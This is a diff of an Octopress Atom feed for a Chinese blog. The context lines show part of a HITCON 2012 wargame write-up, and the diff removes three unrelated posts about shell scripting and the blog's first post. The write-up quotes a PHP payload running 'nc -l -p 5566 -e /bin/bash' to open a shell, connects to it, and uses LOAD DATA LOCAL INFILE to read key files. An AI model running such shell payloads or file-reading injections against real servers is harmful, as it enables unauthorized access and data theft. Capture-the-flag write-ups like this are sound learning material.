@@ -1,8 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
 
-  <title><![CDATA[blog.dm4.tw]]></title>
-  <link href="http://blog.dm4.tw/atom.xml" rel="self"/>
+  <title><![CDATA[Category: hit | blog.dm4.tw]]></title>
+  <link href="http://blog.dm4.tw/blog/categories/hit/atom.xml" rel="self"/>
   <link href="http://blog.dm4.tw/"/>
   <updated>2012-07-24T16:29:41+08:00</updated>
   <id>http://blog.dm4.tw/</id>
@@ -71,7 +71,7 @@ LOAD DATA LOCAL INFILE '/home/ow200/public_html/key.php' INTO TABLE web2;
 ?&gt;
 </code></pre>
 
-<p>本來以為這題這樣就結束了，不過我們想到既然可以用 <code>cat</code> ，搞不好這題可以&#8230;&#8230;</p>
+<p>本來以為這題這樣就結束了，不過我們想到既然可以用 <code>cat</code> ，搞不好這題可以......</p>
 
 <pre><code>&lt;?php
     system('nc -l -p 5566 -e /bin/bash');
@@ -79,7 +79,7 @@ LOAD DATA LOCAL INFILE '/home/ow200/public_html/key.php' INTO TABLE web2;
 ?&gt;
 </code></pre>
 
-<p>然後&#8230;&#8230;</p>
+<p>然後......</p>
 
 <pre><code>[~] $ nc wg.hack.idv.tw 5566
 id
@@ -99,7 +99,7 @@ LOAD DATA LOCAL INFILE '/home/my100/key.txt' INTO TABLE web3;
 
 <h3>Web 6</h3>
 
-<p>也是用爛招&#8230;&#8230; 用 Web 4 拿到的 shell 去看 Web 6 的 source ，在 <code>/home/a200/public_html/index.php</code>
+<p>也是用爛招...... 用 Web 4 拿到的 shell 去看 Web 6 的 source ，在 <code>/home/a200/public_html/index.php</code>
 裡面會判斷如果用 <code>admin</code> 登入的話，會噴 base64 encode 之後的 key</p>
 
 <h3>Potent Pwnables 2</h3>
@@ -109,97 +109,13 @@ LOAD DATA LOCAL INFILE '/home/my100/key.txt' INTO TABLE web3;
 回來之後就被解掉了，id/pw 好像就是 <code>hitcon2012/hitcon2012</code> ，隊友好強啊！</p>
 
 <p>剩下的時間都在試著解 Web 5 ，以及一直看 <a href="http://www.youtube.com/watch?v=l2dvg3KJoPo">駭客觀察日記</a>
-不過看到結束還是沒找到應該怎麼解&#8230;&#8230;</p>
+不過看到結束還是沒找到應該怎麼解......</p>
 
 <p>再次感謝辛苦的主辦單位和工作人員！還有又強又好心收留我帶我一起玩的 crax 隊友！</p>
 
 <p>爽啊！</p>
 
 <p><a href="http://www.flickr.com/photos/51077287@N06/7635469218/" title="Flickr 上 sunrisedm4 的 hitcon-2012-wargame-socre"><img src="http://farm9.staticflickr.com/8426/7635469218_ee0dbce135.jpg" width="500" height="225" alt="hitcon-2012-wargame-socre"></a></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[.bashrc sourced twice]]></title>
-    <link href="http://blog.dm4.tw/blog/2012/05/11/dot-bashrc-sourced-twice/"/>
-    <updated>2012-05-11T21:08:00+08:00</updated>
-    <id>http://blog.dm4.tw/blog/2012/05/11/dot-bashrc-sourced-twice</id>
-    <content type="html"><![CDATA[<p>昨天解決了困擾了一陣子的問題，在 <code>.bashrc</code> 裡，如果有改到 <code>$PATH</code> ：</p>
-
-<pre><code>export PATH=~/bin:$PATH
-</code></pre>
-
-<p>又因為我會用到 <a href="http://tmux.sourceforge.net/">tmux</a> ，所以在 <code>tmux</code> 裡開新的 shell 時，會再 source 一次 <code>.bashrc</code> ，本來我的解法是這樣：</p>
-
-<pre><code>[ -z "$TMUX" ] &amp;&amp; export PATH=~/bin:$PATH
-</code></pre>
-
-<p>也就是在 <code>tmux</code> 裡新開啟的 shell 並不會再改一次 <code>$PATH</code> ，可是這樣又遇到了另一個問題：當新的 shell 打開時，本來應該被加在前面的 <code>~/bin</code> 會被接到後面去，我在想應該是開新 shell 時 bash 自己做的處理，我在 <code>/etc/bashrc</code> 裡也沒有看到相關的 script 。</p>
-
-<p>對於這個問題我最後的解法是參考 <a href="http://perlbrew.pl/">perlbrew</a> 裡的這段 script ：</p>
-
-<pre><code>export PATH_WITHOUT_PERLBREW="$(perl -e 'print join ":", grep { index($_, $ENV{PERLBREW_ROOT}) } split/:/,$ENV{PATH};')"
-
-if [[ -z "$PERLBREW_PATH" ]]; then
-    export PERLBREW_PATH="$PERLBREW_ROOT/bin"
-fi
-
-export PATH="$PERLBREW_PATH:$PATH_WITHOUT_PERLBREW"
-</code></pre>
-
-<p>最後的結果：</p>
-
-<pre><code>export PATH="~/bin:$(perl -e 'print join ":", grep { $_ ne "~/bin" } split/:/, $ENV{PATH};')"
-</code></pre>
-
-<p><strong>Update</strong> 2012-05-13</p>
-
-<p>為了避免 <code>~/bin</code> 和 <code>$HOME/bin</code> 混用，所以改了一下 script</p>
-
-<pre><code>export PATH=$HOME/bin:"$(perl -e 'print join ":", grep { $_ ne "$ENV{HOME}/bin" &amp;&amp; $_ ne "~/bin" } split/:/, $ENV{PATH};')"
-</code></pre>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[[ and [[ in shell script]]></title>
-    <link href="http://blog.dm4.tw/blog/2012/05/10/and-in-shell-script/"/>
-    <updated>2012-05-10T17:01:00+08:00</updated>
-    <id>http://blog.dm4.tw/blog/2012/05/10/and-in-shell-script</id>
-    <content type="html"><![CDATA[<p>終於搞懂在 shell script 裡 <code>[ ... ]</code> 和 <code>[[ ... ]]</code> 的差別了</p>
-
-<pre><code>$ help [
-[: [ arg... ]
-    This is a synonym for the "test" builtin, but the last
-    argument must be a literal `]', to match the opening `['.
-[[ ... ]]: [[ expression ]]
-    Returns a status of 0 or 1 depending on the evaluation of the conditional
-    expression EXPRESSION.  Expressions are composed of the same primaries used
-    by the `test' builtin, and may be combined using the following operators
-
-        ( EXPRESSION )  Returns the value of EXPRESSION
-        ! EXPRESSION    True if EXPRESSION is false; else false
-        EXPR1 &amp;&amp; EXPR2  True if both EXPR1 and EXPR2 are true; else false
-        EXPR1 || EXPR2  True if either EXPR1 or EXPR2 is true; else false
-
-    When the `==' and `!=' operators are used, the string to the right of the
-    operator is used as a pattern and pattern matching is performed.  The
-    &amp;&amp; and || operators do not evaluate EXPR2 if EXPR1 is sufficient to
-    determine the expression's value.
-</code></pre>
-
-<p>簡單的說就是要用 <code>&amp;&amp;</code>, <code>||</code>, <code>!</code>, <code>()</code> 的話要用 <code>[[ ... ]]</code></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[First Post]]></title>
-    <link href="http://blog.dm4.tw/blog/2012/05/08/first-post/"/>
-    <updated>2012-05-08T00:27:00+08:00</updated>
-    <id>http://blog.dm4.tw/blog/2012/05/08/first-post</id>
-    <content type="html"><![CDATA[<p>聽說很潮來用一下傳說中的 octopress</p>
-
-<p>本來覺得不會 ruby 怕怕的，可是還是忍不住想試試看用 <a href="http://markdown.tw">Markdown</a> 寫 blog 的感覺，一試之下才發現……也太方便了吧！</p>
 ]]></content>
   </entry>
   
